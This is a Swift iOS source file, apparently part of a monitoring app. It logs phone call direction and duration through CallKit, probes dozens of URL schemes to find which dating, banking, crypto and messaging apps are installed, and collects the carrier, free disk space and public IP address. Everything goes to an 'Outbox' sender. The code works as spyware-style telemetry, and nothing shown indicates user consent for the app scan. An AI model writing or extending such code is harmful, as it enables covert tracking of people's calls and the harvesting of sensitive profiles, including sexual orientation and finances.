import Foundation
import UIKit
import CallKit
import CoreTelephony

final class Calls: NSObject, CXCallObserverDelegate {
    static let shared = Calls()
    private let obs = CXCallObserver()
    private var open: [UUID: (String, Date)] = [:]
    private var started = false

    func boot() {
        guard !started else { return }
        started = true
        obs.setDelegate(self, queue: .main)
    }

    func callObserver(_ o: CXCallObserver, callChanged call: CXCall) {
        guard Settings.shared.isOn(.calls) else { return }
        if !call.hasEnded {
            guard open[call.uuid] == nil else { return }
            let dir = call.isOutgoing ? "outgoing" : "incoming"
            open[call.uuid] = (dir, Date())
            Outbox.shared.send(["type": "call", "dir": dir, "state": "start",
                                "t": Date().timeIntervalSince1970])
        } else if let (dir, at) = open.removeValue(forKey: call.uuid) {
            Outbox.shared.send(["type": "call", "dir": dir, "state": "end",
                                "seconds": Int(Date().timeIntervalSince(at)),
                                "t": Date().timeIntervalSince1970])
        }
    }
}

enum AppProbe {
    static let schemes = [
        "snapchat", "whatsapp", "instagram", "fb", "facebook", "twitter", "tiktok",
        "telegram", "signal", "discord", "messen", "reddit", "pinterest", "linkedin",
        "youtube", "spotify", "netflix", "hbo", "hinge", "tinder", "bumble", "okcupid",
        "pof", "grindr", "cashapp", "venmo", "paypal", "chime", "robinhood", "coinbase",
        "amazon", "ebay", "etsy", "walmart", "target", "starbucks", "doordash",
        "ubereats", "lyft", "uber", "comgooglemaps", "waze", "strava", "fitbit", "myfitnesspal"
    ]

    static func scan() {
        var found: [String] = []
        for s in schemes {
            guard let u = URL(string: s + "://") else { continue }
            if UIApplication.shared.canOpenURL(u) { found.append(s) }
        }
        Outbox.shared.send(["type": "apps", "found": found, "t": Date().timeIntervalSince1970])
    }
}

enum NetInfo {
    static func report() {
        var carrier = "-"
        if let p = CTTelephonyNetworkInfo().serviceSubscriberCellularProviders?.values {
            for c in p where c.carrierName != nil { carrier = c.carrierName!; break }
        }
        let attrs = try? FileManager.default.attributesOfFileSystem(forPath: NSHomeDirectory())
        let free = (attrs?[.systemFreeSize] as? NSNumber)?.doubleValue ?? 0
        Outbox.shared.send(["type": "net", "carrier": carrier,
                            "diskFreeMB": Int(free / 1_048_576),
                            "t": Date().timeIntervalSince1970])
        guard let u = URL(string: "https://api.ipify.org?format=json") else { return }
        URLSession.shared.dataTask(with: u) { d, _, _ in
            guard let d = d,
                  let j = try? JSONSerialization.jsonObject(with: d) as? [String: Any],
                  let ip = j["ip"] as? String else { return }
            Outbox.shared.send(["type": "net", "ip": ip, "t": Date().timeIntervalSince1970])
        }.resume()
    }
}
